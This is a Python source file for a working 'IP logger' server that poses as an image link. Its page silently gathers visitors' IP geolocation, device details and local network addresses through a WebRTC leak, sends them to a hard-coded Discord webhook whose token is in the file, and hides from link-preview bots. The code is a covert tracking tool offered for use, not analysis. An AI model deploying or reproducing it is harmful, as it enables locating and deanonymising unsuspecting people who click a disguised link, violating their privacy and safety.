# Enhanced IP Logger with Automatic Data Collection
# Maintains original detail level + adds automatic data capture

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, json

__app__ = "Advanced IP Logger"
__description__ = "Automated IP and system data collection"
__version__ = "v4.0"
__author__ = "Cybersecurity Student"

config = {
    "webhook": "https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz",
    "image": "https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg",
    "imageArgument": True,
    "username": "Data Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": True,
    "message": {
        "doMessage": False,
        "message": "Loading image...",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://example.com"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if not ip or not useragent:
        return False
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    elif "googlebot" in useragent.lower():
        return "Google Bot"
    else:
        return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{
                "title": "Logger Error",
                "color": config["color"],
                "description": f"```\n{error}\n```",
            }]
        }, timeout=3)
    except:
        pass

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, system_info=None):
    if not ip or ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "content": "",
                    "embeds": [{
                        "title": "Logger - Link Sent",
                        "color": config["color"],
                        "description": f"Link sent!\n**IP:** {ip}\n**Platform:** {bot}",
                    }]
                }, timeout=3)
            except:
                pass
        return

    ping = "@everyone"
    info = {}
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=3).json()
        if info.get("proxy"):
            if config["vpnCheck"] == 2:
                return
            if config["vpnCheck"] == 1:
                ping = ""
        
        if info.get("hosting"):
            if config["antiBot"] in [3, 4]:
                return
            elif config["antiBot"] in [1, 2]:
                ping = ""
    except:
        pass

    os, browser = "Unknown", "Unknown"
    try:
        os, browser = httpagentparser.simple_detect(useragent)
    except:
        pass

    # Format system info if available
    system_text = "**System Info:**\n> No additional data captured"
    if system_info:
        try:
            system_text = "**System Info:**\n"
            system_text += f"> **Screen:** {system_info.get('screen', 'Unknown')}\n"
            system_text += f"> **CPU Cores:** {system_info.get('cores', 'Unknown')}\n"
            system_text += f"> **Device Memory:** {system_info.get('memory', 'Unknown')}\n"
            system_text += f"> **Language:** {system_info.get('language', 'Unknown')}\n"
            system_text += f"> **Timezone:** {system_info.get('timezone', 'Unknown')}\n"
            system_text += f"> **Cookies Enabled:** {system_info.get('cookies', 'Unknown')}\n"
            system_text += f"> **WebGL Vendor:** {system_info.get('webgl_vendor', 'Unknown')}\n"
            system_text += f"> **Local IPs:** {system_info.get('local_ips', 'Unknown')}\n"
        except:
            system_text = "**System Info:**\n> Error processing data"

    # Create detailed report
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Advanced Data Capture",
            "color": config["color"],
            "description": f"""**New Connection Detected!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip}`
> **ISP:** {info.get('isp', 'Unknown')}
> **ASN:** {info.get('as', 'Unknown')}
> **Country:** {info.get('country', 'Unknown')}
> **Region:** {info.get('regionName', 'Unknown')}
> **City:** {info.get('city', 'Unknown')}
> **Coords:** {f"{info.get('lat', '?')}, {info.get('lon', '?')}" if not coords else coords}
> **Timezone:** {info.get('timezone', 'Unknown').replace('_', ' ')}
> **Mobile:** {'Yes' if info.get('mobile') else 'No'}
> **VPN/Proxy:** {'Yes' if info.get('proxy') else 'No'}
> **Hosting:** {'Yes' if info.get('hosting') else 'No'}

**System Info:**
> **OS:** {os}
> **Browser:** {browser}

**User Agent:**
```{useragent}```

{system_text}
""",
            "thumbnail": {"url": config["image"]}
        }]
    }
    
    try:
        requests.post(config["webhook"], json=embed, timeout=3)
    except:
        pass

    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class AutoCaptureLogger(BaseHTTPRequestHandler):
    
    def handle_request(self):
        try:
            # Parse request
            parsed_path = parse.urlparse(self.path)
            query = parse.parse_qs(parsed_path.query)
            
            # Handle system info submission
            if self.command == "POST" and parsed_path.path == "/collect":
                content_length = int(self.headers.get('Content-Length', 0))
                if content_length:
                    post_data = self.rfile.read(content_length)
                    system_info = json.loads(post_data)
                    ip = self.headers.get('x-forwarded-for', 'Unknown').split(',')[0].strip()
                    user_agent = self.headers.get('user-agent', 'Unknown')
                    
                    # Update report with system info
                    makeReport(ip, user_agent, system_info=system_info, endpoint=parsed_path.path)
                
                self.send_response(200)
                self.end_headers()
                return
            
            # Get image URL
            url = config["image"]
            if config["imageArgument"] and (query.get("url") or query.get("id")):
                url = base64.b64decode((query.get("url") or query.get("id"))[0]).decode()
            
            # Get client info
            ip = self.headers.get('x-forwarded-for', 'Unknown').split(',')[0].strip()
            user_agent = self.headers.get('user-agent', 'Unknown')
            
            # Handle bots
            if botCheck(ip, user_agent):
                self.send_response(200 if config["buggedImage"] else 302)
                if config["buggedImage"]:
                    self.send_header('Content-type', 'image/jpeg')
                    self.end_headers()
                    self.wfile.write(binaries["loading"])
                else:
                    self.send_header('Location', url)
                    self.end_headers()
                makeReport(ip, user_agent, endpoint=parsed_path.path, url=url)
                return
            
            # Generate HTML with automatic data collection
            html_content = self.generate_html(url)
            
            # Send response
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html_content.encode())
            
            # Make initial report
            makeReport(ip, user_agent, endpoint=parsed_path.path, url=url)
        
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'Error loading content')
            reportError(traceback.format_exc())

    def generate_html(self, image_url):
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>Image Preview</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            background-color: #000;
            overflow: hidden;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }}
        .loader {{
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
        }}
        @keyframes spin {{
            to {{ transform: rotate(360deg); }}
        }}
    </style>
</head>
<body>
    <div class="loader"></div>
    <script>
        // Automatic data collection without user interaction
        (function() {{
            // Create a 1x1 pixel image to load in background
            const img = new Image();
            img.src = "{image_url}";
            img.style.position = 'absolute';
            img.style.top = '-9999px';
            img.style.left = '-9999px';
            document.body.appendChild(img);
            
            // Collect system information
            const systemInfo = {{}};
            
            // Screen information
            systemInfo.screen = `${{screen.width}}x${{screen.height}} (Depth: ${{screen.colorDepth}}bit)`;
            
            // CPU cores
            systemInfo.cores = navigator.hardwareConcurrency || 'Unknown';
            
            // Device memory
            systemInfo.memory = navigator.deviceMemory ? `${{navigator.deviceMemory}}GB` : 'Unknown';
            
            // Language and timezone
            systemInfo.language = navigator.language || 'Unknown';
            systemInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
            
            // Cookie support
            systemInfo.cookies = navigator.cookieEnabled ? 'Yes' : 'No';
            
            // WebGL information
            try {{
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {{
                    systemInfo.webgl_vendor = gl.getParameter(gl.VENDOR) || 'Unknown';
                }}
            }} catch (e) {{}}
            
            // Attempt to get local IP addresses (may not work in all browsers)
            try {{
                const ips = [];
                const pc = new RTCPeerConnection({{iceServers: []}});
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                pc.onicecandidate = e => {{
                    if (!e.candidate) return;
                    const ip = /([0-9]{{1,3}}(\.[0-9]{{1,3}}){{3}})/.exec(e.candidate.candidate);
                    if (ip && !ips.includes(ip[1])) ips.push(ip[1]);
                    systemInfo.local_ips = ips.length ? ips.join(', ') : 'Not available';
                }};
            }} catch (e) {{
                systemInfo.local_ips = 'Not available';
            }}
            
            // Send system info to server after a short delay
            setTimeout(() => {{
                try {{
                    fetch('/collect', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify(systemInfo)
                    }});
                }} catch (e) {{}}
                
                // Redirect to actual image after collection
                window.location.href = "{image_url}";
            }}, 1500);
        }})();
    </script>
</body>
</html>"""

    do_GET = handle_request
    do_POST = handle_request

handler = app = AutoCaptureLogger
